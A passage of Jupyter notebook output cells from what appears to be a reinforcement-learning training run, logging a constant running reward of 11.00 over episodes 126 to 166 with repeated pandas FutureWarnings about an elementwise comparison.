      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 126\t Frame count: 63200\t Context: 1\n",
      "Running reward: 11.00\t Episode 126\t Frame count: 63300\t Context: 1\n",
      "Running reward: 11.00\t Episode 126\t Frame count: 63400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 126\t Frame count: 63500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 127\t Frame count: 63600\t Context: 2\n",
      "Running reward: 11.00\t Episode 127\t Frame count: 63700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 128\t Frame count: 63800\t Context: 1\n",
      "Running reward: 11.00\t Episode 128\t Frame count: 63900\t Context: 1\n",
      "Running reward: 11.00\t Episode 128\t Frame count: 64000\t Context: 1\n",
      "Running reward: 11.00\t Episode 128\t Frame count: 64100\t Context: 1\n",
      "Running reward: 11.00\t Episode 128\t Frame count: 64200\t Context: 2\n",
      "Running reward: 11.00\t Episode 128\t Frame count: 64300\t Context: 2\n",
      "Running reward: 11.00\t Episode 128\t Frame count: 64400\t Context: 2\n",
      "Running reward: 11.00\t Episode 128\t Frame count: 64500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 129\t Frame count: 64600\t Context: 1\n",
      "Running reward: 11.00\t Episode 129\t Frame count: 64700\t Context: 2\n",
      "Running reward: 11.00\t Episode 129\t Frame count: 64800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 129\t Frame count: 64900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 130\t Frame count: 65000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 130\t Frame count: 65100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 130\t Frame count: 65200\t Context: 2\n",
      "Running reward: 11.00\t Episode 131\t Frame count: 65300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 132\t Frame count: 65400\t Context: 1\n",
      "Running reward: 11.00\t Episode 132\t Frame count: 65500\t Context: 2\n",
      "Running reward: 11.00\t Episode 133\t Frame count: 65600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 133\t Frame count: 65700\t Context: 2\n",
      "Running reward: 11.00\t Episode 133\t Frame count: 65800\t Context: 2\n",
      "Running reward: 11.00\t Episode 133\t Frame count: 65900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 133\t Frame count: 66000\t Context: 2\n",
      "Running reward: 11.00\t Episode 134\t Frame count: 66100\t Context: 1\n",
      "Running reward: 11.00\t Episode 134\t Frame count: 66200\t Context: 2\n",
      "Running reward: 11.00\t Episode 134\t Frame count: 66300\t Context: 2\n",
      "Running reward: 11.00\t Episode 134\t Frame count: 66400\t Context: 2\n",
      "Running reward: 11.00\t Episode 134\t Frame count: 66500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 134\t Frame count: 66600\t Context: 2\n",
      "Running reward: 11.00\t Episode 134\t Frame count: 66700\t Context: 2\n",
      "Running reward: 11.00\t Episode 134\t Frame count: 66800\t Context: 2\n",
      "Running reward: 11.00\t Episode 135\t Frame count: 66900\t Context: 1\n",
      "Running reward: 11.00\t Episode 135\t Frame count: 67000\t Context: 1\n",
      "Running reward: 11.00\t Episode 135\t Frame count: 67100\t Context: 1\n",
      "Running reward: 11.00\t Episode 135\t Frame count: 67200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 135\t Frame count: 67300\t Context: 2\n",
      "Running reward: 11.00\t Episode 135\t Frame count: 67400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 136\t Frame count: 67500\t Context: 1\n",
      "Running reward: 11.00\t Episode 136\t Frame count: 67600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 136\t Frame count: 67700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 136\t Frame count: 67800\t Context: 1\n",
      "Running reward: 11.00\t Episode 136\t Frame count: 67900\t Context: 2\n",
      "Running reward: 11.00\t Episode 136\t Frame count: 68000\t Context: 2\n",
      "Running reward: 11.00\t Episode 136\t Frame count: 68100\t Context: 2\n",
      "Running reward: 11.00\t Episode 136\t Frame count: 68200\t Context: 2\n",
      "Running reward: 11.00\t Episode 136\t Frame count: 68300\t Context: 2\n",
      "Running reward: 11.00\t Episode 136\t Frame count: 68400\t Context: 2\n",
      "Running reward: 11.00\t Episode 136\t Frame count: 68500\t Context: 2\n",
      "Running reward: 11.00\t Episode 137\t Frame count: 68600\t Context: 2\n",
      "Running reward: 11.00\t Episode 137\t Frame count: 68700\t Context: 2\n",
      "Running reward: 11.00\t Episode 138\t Frame count: 68800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 138\t Frame count: 68900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 138\t Frame count: 69000\t Context: 1\n",
      "Running reward: 11.00\t Episode 138\t Frame count: 69100\t Context: 1\n",
      "Running reward: 11.00\t Episode 138\t Frame count: 69200\t Context: 1\n",
      "Running reward: 11.00\t Episode 138\t Frame count: 69300\t Context: 2\n",
      "Running reward: 11.00\t Episode 139\t Frame count: 69400\t Context: 1\n",
      "Running reward: 11.00\t Episode 139\t Frame count: 69500\t Context: 2\n",
      "Running reward: 11.00\t Episode 139\t Frame count: 69600\t Context: 2\n",
      "Running reward: 11.00\t Episode 139\t Frame count: 69700\t Context: 2\n",
      "Running reward: 11.00\t Episode 139\t Frame count: 69800\t Context: 2\n",
      "Running reward: 11.00\t Episode 139\t Frame count: 69900\t Context: 2\n",
      "Running reward: 11.00\t Episode 139\t Frame count: 70000\t Context: 2\n",
      "Running reward: 11.00\t Episode 139\t Frame count: 70100\t Context: 2\n",
      "Running reward: 11.00\t Episode 140\t Frame count: 70200\t Context: 2\n",
      "Running reward: 11.00\t Episode 140\t Frame count: 70300\t Context: 2\n",
      "Running reward: 11.00\t Episode 140\t Frame count: 70400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 140\t Frame count: 70500\t Context: 2\n",
      "Running reward: 11.00\t Episode 142\t Frame count: 70600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 142\t Frame count: 70700\t Context: 1\n",
      "Running reward: 11.00\t Episode 142\t Frame count: 70800\t Context: 1\n",
      "Running reward: 11.00\t Episode 142\t Frame count: 70900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 142\t Frame count: 71000\t Context: 1\n",
      "Running reward: 11.00\t Episode 142\t Frame count: 71100\t Context: 1\n",
      "Running reward: 11.00\t Episode 143\t Frame count: 71200\t Context: 1\n",
      "Running reward: 11.00\t Episode 143\t Frame count: 71300\t Context: 2\n",
      "Running reward: 11.00\t Episode 143\t Frame count: 71400\t Context: 2\n",
      "Running reward: 11.00\t Episode 143\t Frame count: 71500\t Context: 2\n",
      "Running reward: 11.00\t Episode 143\t Frame count: 71600\t Context: 2\n",
      "Running reward: 11.00\t Episode 144\t Frame count: 71700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 144\t Frame count: 71800\t Context: 1\n",
      "Running reward: 11.00\t Episode 144\t Frame count: 71900\t Context: 2\n",
      "Running reward: 11.00\t Episode 144\t Frame count: 72000\t Context: 2\n",
      "Running reward: 11.00\t Episode 144\t Frame count: 72100\t Context: 2\n",
      "Running reward: 11.00\t Episode 144\t Frame count: 72200\t Context: 2\n",
      "Running reward: 11.00\t Episode 145\t Frame count: 72300\t Context: 2\n",
      "Running reward: 11.00\t Episode 146\t Frame count: 72400\t Context: 1\n",
      "Running reward: 11.00\t Episode 146\t Frame count: 72500\t Context: 1\n",
      "Running reward: 11.00\t Episode 146\t Frame count: 72600\t Context: 1\n",
      "Running reward: 11.00\t Episode 146\t Frame count: 72700\t Context: 2\n",
      "Running reward: 11.00\t Episode 146\t Frame count: 72800\t Context: 2\n",
      "Running reward: 11.00\t Episode 146\t Frame count: 72900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 146\t Frame count: 73000\t Context: 2\n",
      "Running reward: 11.00\t Episode 146\t Frame count: 73100\t Context: 2\n",
      "Running reward: 11.00\t Episode 146\t Frame count: 73200\t Context: 2\n",
      "Running reward: 11.00\t Episode 147\t Frame count: 73300\t Context: 2\n",
      "Running reward: 11.00\t Episode 148\t Frame count: 73400\t Context: 1\n",
      "Running reward: 11.00\t Episode 148\t Frame count: 73500\t Context: 2\n",
      "Running reward: 11.00\t Episode 148\t Frame count: 73600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 148\t Frame count: 73700\t Context: 2\n",
      "Running reward: 11.00\t Episode 148\t Frame count: 73800\t Context: 2\n",
      "Running reward: 11.00\t Episode 148\t Frame count: 73900\t Context: 2\n",
      "Running reward: 11.00\t Episode 148\t Frame count: 74000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 149\t Frame count: 74100\t Context: 2\n",
      "Running reward: 11.00\t Episode 149\t Frame count: 74200\t Context: 2\n",
      "Running reward: 11.00\t Episode 150\t Frame count: 74300\t Context: 1\n",
      "Running reward: 11.00\t Episode 150\t Frame count: 74400\t Context: 1\n",
      "Running reward: 11.00\t Episode 150\t Frame count: 74500\t Context: 1\n",
      "Running reward: 11.00\t Episode 150\t Frame count: 74600\t Context: 2\n",
      "Running reward: 11.00\t Episode 151\t Frame count: 74700\t Context: 1\n",
      "Running reward: 11.00\t Episode 151\t Frame count: 74800\t Context: 1\n",
      "Running reward: 11.00\t Episode 151\t Frame count: 74900\t Context: 1\n",
      "Running reward: 11.00\t Episode 151\t Frame count: 75000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 151\t Frame count: 75100\t Context: 2\n",
      "Running reward: 11.00\t Episode 151\t Frame count: 75200\t Context: 2\n",
      "Running reward: 11.00\t Episode 151\t Frame count: 75300\t Context: 2\n",
      "Running reward: 11.00\t Episode 151\t Frame count: 75400\t Context: 2\n",
      "Running reward: 11.00\t Episode 151\t Frame count: 75500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 151\t Frame count: 75600\t Context: 2\n",
      "Running reward: 11.00\t Episode 152\t Frame count: 75700\t Context: 1\n",
      "Running reward: 11.00\t Episode 152\t Frame count: 75800\t Context: 1\n",
      "Running reward: 11.00\t Episode 152\t Frame count: 75900\t Context: 2\n",
      "Running reward: 11.00\t Episode 152\t Frame count: 76000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 153\t Frame count: 76100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 153\t Frame count: 76200\t Context: 1\n",
      "Running reward: 11.00\t Episode 153\t Frame count: 76300\t Context: 1\n",
      "Running reward: 11.00\t Episode 153\t Frame count: 76400\t Context: 1\n",
      "Running reward: 11.00\t Episode 154\t Frame count: 76500\t Context: 1\n",
      "Running reward: 11.00\t Episode 154\t Frame count: 76600\t Context: 2\n",
      "Running reward: 11.00\t Episode 155\t Frame count: 76700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 155\t Frame count: 76800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 156\t Frame count: 76900\t Context: 1\n",
      "Running reward: 11.00\t Episode 156\t Frame count: 77000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 156\t Frame count: 77100\t Context: 2\n",
      "Running reward: 11.00\t Episode 156\t Frame count: 77200\t Context: 2\n",
      "Running reward: 11.00\t Episode 157\t Frame count: 77300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 157\t Frame count: 77400\t Context: 1\n",
      "Running reward: 11.00\t Episode 157\t Frame count: 77500\t Context: 1\n",
      "Running reward: 11.00\t Episode 158\t Frame count: 77600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 158\t Frame count: 77700\t Context: 1\n",
      "Running reward: 11.00\t Episode 158\t Frame count: 77800\t Context: 1\n",
      "Running reward: 11.00\t Episode 158\t Frame count: 77900\t Context: 1\n",
      "Running reward: 11.00\t Episode 158\t Frame count: 78000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 158\t Frame count: 78100\t Context: 1\n",
      "Running reward: 11.00\t Episode 158\t Frame count: 78200\t Context: 1\n",
      "Running reward: 11.00\t Episode 158\t Frame count: 78300\t Context: 2\n",
      "Running reward: 11.00\t Episode 159\t Frame count: 78400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 159\t Frame count: 78500\t Context: 1\n",
      "Running reward: 11.00\t Episode 160\t Frame count: 78600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 160\t Frame count: 78700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 161\t Frame count: 78800\t Context: 2\n",
      "Running reward: 11.00\t Episode 162\t Frame count: 78900\t Context: 1\n",
      "Running reward: 11.00\t Episode 162\t Frame count: 79000\t Context: 2\n",
      "Running reward: 11.00\t Episode 163\t Frame count: 79100\t Context: 1\n",
      "Running reward: 11.00\t Episode 163\t Frame count: 79200\t Context: 2\n",
      "Running reward: 11.00\t Episode 163\t Frame count: 79300\t Context: 2\n",
      "Running reward: 11.00\t Episode 164\t Frame count: 79400\t Context: 1\n",
      "Running reward: 11.00\t Episode 165\t Frame count: 79500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 165\t Frame count: 79600\t Context: 1\n",
      "Running reward: 11.00\t Episode 165\t Frame count: 79700\t Context: 1\n",
      "Running reward: 11.00\t Episode 165\t Frame count: 79800\t Context: 2\n",
      "Running reward: 11.00\t Episode 166\t Frame count: 79900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 166\t Frame count: 80000\t Context: 1\n",
      "Running reward: 11.00\t Episode 166\t Frame count: 80100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 166\t Frame count: 80200\t Context: 2\n",
      "Running reward: 11.00\t Episode 166\t Frame count: 80300\t Context: 2\n",
      "Running reward: 11.00\t Episode 166\t Frame count: 80400\t Context: 2\n",
